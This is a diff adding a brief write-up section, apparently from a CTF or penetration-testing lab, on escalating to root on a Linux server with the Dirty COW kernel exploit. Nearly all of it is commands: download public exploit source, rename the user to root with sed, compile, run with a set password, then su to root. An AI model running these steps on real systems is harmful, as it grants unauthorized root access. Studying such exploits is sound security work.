@@ -1,0 +1,19 @@
+### Dirty cow
+by using the `linux-expoit-suggestor.sh` we found some interesting expliot that can be done on the server.
+
+https://dirtycow.ninja/
+
+Dirty cow
+```sh
+wget "https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c"
+
+sed -i "s/firefart/root/g" dirty.c
+
+gcc dirty.c -o dirty -lcrypt -lpthread
+
+./dirty 1234
+[...]
+su root
+password: 1234
+```
+
